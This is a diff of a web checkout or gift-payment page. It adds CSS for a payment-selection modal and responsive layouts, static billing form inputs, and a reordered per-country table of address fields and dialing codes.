@@ -153,6 +153,18 @@ ul.features i{width:20px;margin-right:8px;color:#b2bdfc;}
 
 
 
+/* ===== PAYMENT SELECTION MODAL ===== */
+#selectModal .option{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px 16px;font-size:16px;background:#5865F2;border:2px solid #5865F2;border-radius:10px;color:#fff;cursor:pointer;transform:scale(1);transition:all .25s ease;}
+
+#selectModal .option.active{background:#3c47be;border:2px solid #3c47be;transform:scale(1.05);}
+
+/* Icon styling */
+#selectModal .option i{font-size:20px;}
+
+#selectModal .option.active i{color:#fff;}
+
+/* Hover effect */
+#selectModal .option:hover{background:#4a57c1;transform:scale(1.03);}
 
 
 
@@ -305,6 +317,22 @@ option{background:#1e1f22;color:#fff;}
 #payment-next.btn-disabled{background-color:#5865F2;color:#fff;cursor:not-allowed;pointer-events:none;border-radius:8px;opacity:.5;box-shadow:none;}
 
 
+
+
+
+
+/* 8️⃣ Tablet landscape */
+@media (max-width:1024px) {
+  .gift-flex { flex-direction:column; }
+  .modal-left, .modal-right { width:100%; padding:20px; }
+}
+
+/* 🔟 Large mobile / phablet */
+@media (max-width:768px) {
+  .footer { flex-direction:column; gap:12px; }
+}
+
+
 /* 8️⃣ Tablet landscape */
 @media (max-width:1024px) {
   .gift-flex { flex-direction:column; }
@@ -441,9 +469,62 @@ option{background:#1e1f22;color:#fff;}
   .card-number-box { width: 100%; font-size: 12px; padding: 6px 8px; }
 }
 
-</style>
+
+/* 1️⃣4️⃣ Small phones */
+@media (max-width:500px) {
+
+  /* Keep buttons in one line, same as desktop */
+  .footer {
+    flex-direction: row !important;
+    justify-content: space-between !important;
+    align-items: center !important;
+    width: 100%;
+  }
+
+  /* Button sizing for small screen */
+  .footer button {
+    padding: 10px 14px;
+    font-size: 14px;
+  }
+}
+
+/* Small phone adjustments for card icons */
+@media (max-width: 480px) {
+  .card-icons img {
+    height: 16px;
+    max-width: 40px;
+  }
+}
 
 
+
+
+
+/* 2️⃣0️⃣ Ultra tiny (280px and below) */
+/* 📱 Ultra tiny screens (≤ 280px width) */
+@media (max-width: 280px) {
+  body {
+    padding: 4px;
+  }
+
+  .option {
+    padding: 8px;
+    font-size: 12px;
+  }
+
+  .card-icons img {
+    height: 16px;
+  }
+
+  /* ✅ Huwag fixed min-width — gamitin responsive width */
+  .small input,
+  .full input,
+  .card-number-box {
+    width: 100%;
+    font-size: 12px;
+    padding: 6px 8px;
+  }
+}
 
 </style>
 
@@ -628,7 +709,7 @@ option{background:#1e1f22;color:#fff;}
     <div class="billing-header">
       <h3>Billing Address</h3>
       <div class="country-select">
-        <img id="flagImg" src="https://flagcdn.com/w20/zw.png" alt="flag">
+        <img id="flagImg" src="https://flagcdn.com/w20/us.png" alt="flag">
         <select id="countrySelect">
           <option value="af" data-flag="https://flagcdn.com/w20/af.png">Afghanistan</option>
           <option value="ax" data-flag="https://flagcdn.com/w20/ax.png">Åland Islands</option>
@@ -888,7 +969,36 @@ option{background:#1e1f22;color:#fff;}
         </select>
       </div>
     </div>
-    <form id="billingForm" class="form-grid"></form>
+    <form id="billingForm" class="form-grid">
+      <!-- First + Last Name -->
+      <div class="form-grid">
+        <input type="text" id="first-name" name="first_name" placeholder="First Name" class="form-control" required>
+        <input type="text" id="last-name" name="last_name" placeholder="Last Name" class="form-control" required>
+      </div>
+
+      <!-- Mobile -->
+      <input type="text" id="mobile" name="mobile" placeholder="Mobile Number" class="form-control" required> 
+      <!-- Email -->
+      <input type="email" id="email" name="email" placeholder="Email" class="form-control" required>
+
+      
+      
+      <input type="text" id="address-line-1" name="address-line-1" placeholder="Address Line 1">
+      <input type="text" id="address-line-2" name="address-line-2" placeholder="Address Line 2">
+      <input type="text" id="address-line-3" name="address-line-3" placeholder="Address Line 3">
+      <input type="text" id="address-line-4" name="address-line-3" placeholder="Address Line 4">
+      <input type="text" id="address-line-5" name="address-line-3" placeholder="Address Line 5">
+
+      
+      <input type="text" id="city" name="city" placeholder="City">
+
+      <input type="text" id="postal-code" name="postal-code" placeholder="Postal Code">
+      <input type="text" id="zip-code" name="zip-code" placeholder="Zip Code">
+      
+
+
+
+    </form>
   </div>
 
   <div class="footer">
@@ -1029,27 +1139,27 @@ backToGift.addEventListener('click', () => {
    COUNTRY BILLING FORM
 ============================== */
 const COUNTRY_FORMS = {
-  af: { dial: "+93", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  ax: { dial: "+358", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  al: { dial: "+355", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  af: { dial: "+93", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  ax: { dial: "+358", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  al: { dial: "+355", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   dz: { dial: "+213", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  as: { dial: "+1-684", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
+  as: { dial: "+1-684", fields: [["First name","Last name"],["Address line 1"],["City"],["Postal code"],["Mobile"],["Email"]] },
   ad: { dial: "+376", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ao: { dial: "+244", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ai: { dial: "+1-264", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  aq: { dial: "+672", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
+  aq: { dial: "+672", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Mobile"],["Email"]] },
   ag: { dial: "+1-268", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ar: { dial: "+54", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Province"],["Mobile"],["Email"]] },
+  ar: { dial: "+54", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Address line 3"],["Province"],["City"],["Postal code"],["Mobile"],["Email"]] },
   am: { dial: "+374", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   aw: { dial: "+297", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   au: { dial: "+61", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Suburb"],["State / territory"],["Postal code"],["Mobile"],["Email"]] },
-  at: { dial: "+43", fields: [["First name","Last name"],["Street name and house number"],["Additional information"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  at: { dial: "+43", fields: [["First name","Last name"],["Street name and house number"],["Additional information"],["City"],["Postal code"],["Mobile"],["Email"]] },
   az: { dial: "+994", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bs: { dial: "+1-242", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bh: { dial: "+973", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bd: { dial: "+880", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   bb: { dial: "+1-246", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  by: { dial: "+375", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["Locality"],["Province"],["Mobile"],["Email"]] },
+  by: { dial: "+375", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["Province"],["Postal code"],["Mobile"],["Email"]] },
   be: { dial: "+32", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   bz: { dial: "+501", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bj: { dial: "+229", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
@@ -1060,7 +1170,7 @@ const COUNTRY_FORMS = {
   ba: { dial: "+387", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bw: { dial: "+267", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bv: { dial: "+47", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  br: { dial: "+55", fields: [["First name","Last name"],["Postal code (CEP)"],["Address"],["District / Neighborhood"],["City"],["State"],["CPF or CNPJ"],["Mobile"],["Email"]] },
+  br: { dial: "+55", fields: [["First name","Last name"],["Address"],["District / Neighborhood"],["State"],["CPF or CNPJ"],["Postal code (CEP)"],["City"],["Mobile"],["Email"]] },
   io: { dial: "+246", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   bn: { dial: "+673", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["District / Capital"],["Postal code"],["Mobile"],["Email"]] },
   bg: { dial: "+359", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
@@ -1068,38 +1178,38 @@ const COUNTRY_FORMS = {
   bi: { dial: "+257", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   kh: { dial: "+855", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Province"],["Postal code"],["Mobile"],["Email"]] },
   cm: { dial: "+237", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["Mobile"],["Email"]] },
-  ca: { dial: "+1", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Province"],["Postal code"],["Mobile"],["Email"]] },
+  ca: { dial: "+1", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Address line 3"],["Province"],["City"],["Postal code"],["Mobile"],["Email"]] },
   cv: { dial: "+238", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ky: { dial: "+1-345", fields: [["First name","Last name"],["Street name and house number"],["More address details"],["Island's name"],["State"],["Postal code"],["Mobile"],["Email"]] },
+  ky: { dial: "+1-345", fields: [["First name","Last name"],["Street name and house number"],["More address details"],["State"],["Island's name"],["Postal code"],["Mobile"],["Email"]] },
   cf: { dial: "+236", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   td: { dial: "+235", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  cl: { dial: "+56", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["Commune / Locality"],["Region"],["Mobile"],["Email"]] },
+  cl: { dial: "+56", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Commune / Locality"],["Region"],["Postal code"],["Mobile"],["Email"]] },
   cn: { dial: "+86", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Province / Municipality"],["City"],["Postal code"],["Mobile"],["Email"]] },
 
   cx: { dial: "+61", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   cc: { dial: "+61", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  co: { dial: "+57", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Department / Capital District"],["Mobile"],["Email"]] },
+  co: { dial: "+57", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Department / Capital District"],["City"],["Postal code"],["Mobile"],["Email"]] },
   km: { dial: "+269", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   cg: { dial: "+242", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   cd: { dial: "+243", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ck: { dial: "+682", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  cr: { dial: "+506", fields: [["First name","Last name"],["Address line 1"],["Province"],["Canton"],["District"],["Postal code"],["Mobile"],["Email"]] },
+  cr: { dial: "+506", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Canton"],["District / Province"],["Postal code"],["Mobile"],["Email"]] },
   ci: { dial: "+225", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Mobile"],["Email"]] },
   hr: { dial: "+385", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
   cu: { dial: "+53", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   cw: { dial: "+599", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  cy: { dial: "+357", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town / Village"],["Mobile"],["Email"]] },
-  cz: { dial: "+420", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Delivery post office"],["Mobile"],["Email"]] },
-  dk: { dial: "+45", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  cy: { dial: "+357", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
+  cz: { dial: "+420", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Delivery post office"],["Postal code"],["Mobile"],["Email"]] },
+  dk: { dial: "+45", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   dj: { dial: "+253", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   dm: { dial: "+1-767", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   do: { dial: "+1-809", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Municipality"],["Province"],["Postal code"],["Mobile"],["Email"]] },
-  ec: { dial: "+593", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["Town"],["Mobile"],["Email"]] },
+  ec: { dial: "+593", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Town"],["Postal code"],["Mobile"],["Email"]] },
   eg: { dial: "+20", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  sv: { dial: "+503", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Department"],["Mobile"],["Email"]] },
+  sv: { dial: "+503", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Department"],["City"],["Postal code"],["Mobile"],["Email"]] },
   gq: { dial: "+240", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   er: { dial: "+291", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ee: { dial: "+372", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["District / Parish"],["Postal code"],["City /Country"],["Mobile"],["Email"]] },
+  ee: { dial: "+372", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["District / Parish"],["City"],["Postal code"],["Mobile"],["Email"]] },
   sz: { dial: "+268", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   et: { dial: "+251", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   fk: { dial: "+500", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
@@ -1129,29 +1239,29 @@ const COUNTRY_FORMS = {
   ht: { dial: "+509", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   hm: { dial: "+672", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
 
-  va: { dial: "+379", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Potal code"],["City"],["Mobile"],["Email"]] },
+  va: { dial: "+379", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Potal code"],["Mobile"],["Email"]] },
   hn: { dial: "+504", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  hk: { dial: "+852", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Region"],["District / Area"],["Mobile"],["Email"]] },
+  hk: { dial: "+852", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["District / Area"],["Region"],["Mobile"],["Email"]] },
   hu: { dial: "+36", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
-  is: { dial: "+354", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["Town"],["Mobile"],["Email"]] },
-  in: { dial: "+91", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Town / City"],["State"],["PIN codes"],["Mobile"],["Email"]] },
-  id: { dial: "+62", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Province"],["Postal code"],["Mobile"],["Email"]] },
+  is: { dial: "+354", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Town"],["Postal code"],["Mobile"],["Email"]] },
+  in: { dial: "+91", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["State"],["Town / City"],["PIN codes"],["Mobile"],["Email"]] },
+  id: { dial: "+62", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Address line 3"],["Province"],["City"],["Postal code"],["Mobile"],["Email"]] },
   ir: { dial: "+98", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   iq: { dial: "+964", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  ie: { dial: "+353", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Town / City"],["Country / Dublin postal district"],["Postal code"],["Mobile"],["Email"]] },
+  ie: { dial: "+353", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Country / Dublin postal district"],["Town / City"],["Postal code"],["Mobile"],["Email"]] },
   im: { dial: "+44-1624", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   il: { dial: "+972", fields: [["First name","Last name"],["Street and house number"],["More address details"],["City"],["Zip codes"],["Mobile"],["Email"]] },
-  it: { dial: "+39", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Province"],["Mobile"],["Email"]] },
+  it: { dial: "+39", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Address line 3"],["Province"],["City"],["Postal code"],["Mobile"],["Email"]] },
   jm: { dial: "+1-876", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  jp: { dial: "+81", fields: [["First name","Last name"],["Postal code"],["Prefecture"],["City / Ward / Town / Village"],["Street name and street number"],["Building name, floor, room number"],["Mobile"],["Email"]] },
+  jp: { dial: "+81", fields: [["First name","Last name"],["Prefecture"],["City / Ward / Town / Village"],["Street name and street number"],["Building name, floor, room number"],["Postal code"],["Mobile"],["Email"]] },
   je: { dial: "+44-1534", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   jo: { dial: "+962", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  kz: { dial: "+7", fields: [["First name","Last name"],["Street name and house number"],["City"],["District"],["Region / Independent city"],["Postal code"],["Mobile"],["Email"]] },
+  kz: { dial: "+7", fields: [["First name","Last name"],["Street name and house number"],["Region / Independent city"],["District"],["City"],["Postal code"],["Mobile"],["Email"]] },
   ke: { dial: "+254", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ki: { dial: "+686", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   xk: { dial: "+383", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  kw: { dial: "+965", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
-  kg: { dial: "+996", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Province"],["Mobile"],["Email"]] },
+  kw: { dial: "+965", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  kg: { dial: "+996", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Province"],["Postal code"],["Mobile"],["Email"]] },
   la: { dial: "+856", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   lv: { dial: "+371", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
   lb: { dial: "+961", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
@@ -1159,63 +1269,63 @@ const COUNTRY_FORMS = {
   lr: { dial: "+231", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   ly: { dial: "+218", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   li: { dial: "+423", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  lt: { dial: "+370", fields: [["First name","Last name"],["Address line 1"],["Postal code"],["City / Town / Village"],["Mobile"],["Email"]] },
-  lu: { dial: "+352", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  lt: { dial: "+370", fields: [["First name","Last name"],["Address line 1"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
+  lu: { dial: "+352", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   mo: { dial: "+853", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   mg: { dial: "+261", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   mw: { dial: "+265", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  my: { dial: "+60", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town / Locality"],["State / Federal territory"],["Mobile"],["Email"]] },
+  my: { dial: "+60", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Locality"],["State / Federal territory"],["Postal code"],["Mobile"],["Email"]] },
   mv: { dial: "+960", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Region"],["Postal code"],["Mobile"],["Email"]] },
   ml: { dial: "+223", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   mt: { dial: "+356", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
   mh: { dial: "+692", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  mq: { dial: "+596", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  mq: { dial: "+596", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   mr: { dial: "+222", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  mu: { dial: "+230", fields: [["First name","Last name"],["Street name and house number"],["Sub-locality"],["Main village / Town"],["Postal code"],["District / Dependency"],["Mobile"],["Email"]] },
-  yt: { dial: "+262", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
-  mx: { dial: "+52", fields: [["First name","Last name"],["Address line 1"],["Neighborhood / Quarter"],["City"],["State"],["Postal code"],["Mobile"],["Email"]] },
-  fm: { dial: "+691", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["State"],["Zip code"],["Mobile"],["Email"]] },
-  md: { dial: "+373", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
-  mc: { dial: "+377", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  mu: { dial: "+230", fields: [["First name","Last name"],["Street name and house number"],["Sub-locality"],["Main village / Town"],["District / Dependency"],["Postal code"],["Mobile"],["Email"]] },
+  yt: { dial: "+262", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  mx: { dial: "+52", fields: [["First name","Last name"],["Address line 1"],["Neighborhood / Quarter"],["State"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  fm: { dial: "+691", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["State"],["City"],["Zip code"],["Mobile"],["Email"]] },
+  md: { dial: "+373", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  mc: { dial: "+377", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   mn: { dial: "+976", fields: [["First name","Last name"],["Address"],["Sub-district / Sub-division"],["District / Sub-province"],["Capital / Province"],["Postal code"],["Mobile"],["Email"]] },
   me: { dial: "+382", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["Mobile"],["Email"]] },
   ms: { dial: "+1-664", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ma: { dial: "+212", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town / Village"],["Mobile"],["Email"]] },
+  ma: { dial: "+212", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
   mz: { dial: "+258", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
 
   mm: { dial: "+95", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   na: { dial: "+264", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   nr: { dial: "+674", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   np: { dial: "+977", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / District"],["Zone / Capital"],["Postal code"],["Mobile"],["Email"]] },
-  nl: { dial: "+31", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  nl: { dial: "+31", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   nc: { dial: "+687", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   nz: { dial: "+64", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Suburb"],["Postal code"],["Mobile"],["Email"]] },
   ni: { dial: "+505", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ne: { dial: "+227", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
